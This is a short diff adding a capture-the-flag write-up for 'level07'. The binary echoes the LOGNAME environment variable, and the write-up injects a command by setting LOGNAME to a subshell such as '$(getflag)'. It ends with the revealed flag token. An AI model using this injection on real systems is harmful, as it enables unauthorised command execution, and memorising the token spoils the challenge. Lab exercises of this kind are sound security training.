@@ -1,0 +1,10 @@
+level07
+
+$ strings level07
+We see it uses getenv to get the environment variable LOGNAME and print its content with echo.
+We can put a subshell as LOGNAME to execute any command we want:
+
+LOGNAME="\$(getflag)" ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
